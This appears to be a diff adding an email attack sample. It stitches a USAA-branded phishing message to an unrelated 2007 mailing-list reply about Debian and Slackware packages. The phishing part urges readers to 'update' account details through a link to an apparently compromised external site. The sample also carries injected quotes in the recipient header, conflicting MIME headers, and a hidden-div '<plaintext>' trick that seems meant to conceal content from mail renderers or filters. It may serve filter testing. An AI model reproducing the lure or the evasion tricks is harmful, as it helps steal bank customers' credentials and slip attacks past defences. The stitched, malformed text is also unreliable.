@@ -1,0 +1,107 @@
+From: jroyed@ev1.net
+To: <claudia".'"robinson@enron.com>, .eber@enron.com, .brady@enron.com, 
+Subject: MIME Attack Sample
+Content-Type: multipart/mixed; boundary="BOUNDARY"
+--BOUNDARY
+Content-Type: text/html
+Content-Type: text/plain; charset="us-ascii"
+Content-Transfer-Encoding: quoted-printable
+
+
+ =20
+You have an incoming payment.=20
+We are unable to process this payment to your account
+as your details has not been updated
+Click here to fix this transaction and view your
+current balance
+
+Update
+Thank you for your banking with us.
+
+Sincerely,
+USAA Bank
+
+------=_NextPart_000_019E_01CF7406.1A2C7260
+Content-Type: text/html; charset="us-ascii"
+Content-Transfer-Encoding: quoted-printable
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
+<HTML><HEAD>
+<META content=3D"text/html; charset=3Dus-ascii" http-equiv=3DContent-Type=
+>
+<META name=3DGENERATOR content=3D"MSHTML 9.00.8112.16437">
+<STYLE></STYLE>
+</HEAD>
+<BODY bgColor=3D#ffffff>
+<DIV>
+<DIV><FONT size=3D2 face=3DArial><IMG=20
+alt=3Dhttps://encrypted-tbn2.gstatic.com/images?q=3Dtbn:ANd9GcT7T6NDArZkf=
+CuWPJ-JAT8wjRvQYR3y3idGOdidroyDITz4nopk0HYZyt20=20
+src=3D"https://ci5.googleusercontent.com/proxy/JNTpP_2pGT7Bs9MKIdbvHpjBke=
+RFaP9kCezDy8X2EyYMi7iRdzXQ3k7IPjo2qPbg7KpIzrCCbj0uRq3FPLmha5HPEKul6uZvJ5n=
+ZcRcgMH2wOEbq9osmX2Ze-LNI5RWVhxYBG7fp0gV1sQUWIgeuN8zje4GEuC3kLOhGL-o80C_1=
+GhGzY5Q=3Ds0-d-e1-ft#https://encrypted-tbn2.gstatic.com/images?q=3Dtbn:AN=
+d9GcT7T6NDArZkfCuWPJ-JAT8wjRvQYR3y3idGOdidroyDITz4nopk0HYZyt20"></FONT></=
+DIV>
+<DIV><FONT size=3D2 face=3DArial><FONT face=3DVerdana>&nbsp;</FONT>=20
+<DIV>
+<DIV>
+<DIV><FONT color=3D#666666 face=3DArial><STRONG>You have an incoming paym=
+ent. <BR>We=20
+are unable to process this payment to your account<BR>as your details has=
+ not=20
+been updated<BR>Click here to fix this transaction and view your<BR>curre=
+nt=20
+balance<BR></STRONG></FONT><PRE><SPAN style=3D"FONT-SIZE: 12px; FONT-FAMI=
+LY: 'Lucida Grande',Arial,sans-serif; COLOR: rgb(34,34,34)"><FONT color=3D=
+#666666 size=3D2 face=3DArial><STRONG><B><A href=3D"http://banianbehboodi=
+.ir/wp/index.htm" rel=3Dnofollow target=3D_blank><SPAN>Update</SPAN></A><=
+/B><BR>
+</STRONG></FONT></SPAN><SPAN style=3D"FONT-SIZE: 12px; FONT-FAMILY: 'Luci=
+da Grande',Arial,sans-serif; COLOR: rgb(34,34,34)"><FONT color=3D#666666 =
+size=3D2 face=3DArial><STRONG>Thank you for your banking with us.
+
+Sincerely,
+<SPAN>USAA Bank</SPAN></STRONG></FONT></SPAN></PRE></DIV></DIV></DIV></FO=
+NT></DIV></DIV>
+<DIV>&nbsp;</DIV></BODY></HTML>
+
+------=_NextPart_000_019E_01CF7406.1A2C7260--
+<style>fieldset, br{display: none;}</style>
+<div style="display: none;"><plaintext>
+--BOUNDARY
+Content-Type: text/plain
+-BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA1
+
+On Sun, Jun 24, 2007 at 07:00:03PM +0100, Gaijin wrote:
+> Want to do a diff on my old Devian package 
+> listing.  Try to match some of the packages I liked, and to rewind 
+> myself of what I used to have.  Thanks,
+> 
+
+There is a good chance you'll need to do quite a bit of compiling from
+source. Slackware's binary package collection is much, much smaller
+then debian's.
+
+Greg
+
+
+
+- -- 
+web site: http://www.romuald.net.eu.org
+gpg public key: http://www.romuald.net.eu.org/pubkey.asc
+skype: gregn1
+(authorization required, add me to your contacts list first)
+
+- --
+Free domains: http://www.eu.org/ or mail dns-manager@EU.org
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1.4.6 (GNU/Linux)
+
+iD8DBQFGfzF27s9z/XlyUyARAkGkAKCjj8r8H00rq2Yu2HlMWIvnc8RpZgCfcUIC
+obNqugsuBrRj+G799H6U5xU=
+=Iipe
+-----END PGP SIGNATURE-----
+
+____-BOUNDARY--
